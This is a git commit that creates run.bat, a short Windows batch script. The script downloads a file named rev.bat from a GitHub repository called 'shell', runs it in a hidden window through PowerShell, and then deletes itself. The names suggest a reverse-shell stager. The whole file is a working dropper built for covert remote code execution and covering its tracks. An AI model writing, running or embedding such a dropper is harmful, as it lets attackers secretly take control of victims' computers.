5b94848f67fd2f5f911cbf74d27344ab5acd3d3a
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-06 20:20:53 +0300

    Create run.bat

---
+++ run.bat
@@ -0,0 +1,4 @@
+@echo off
+curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%temp%\rev.bat"
+powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
+del "%~f0"
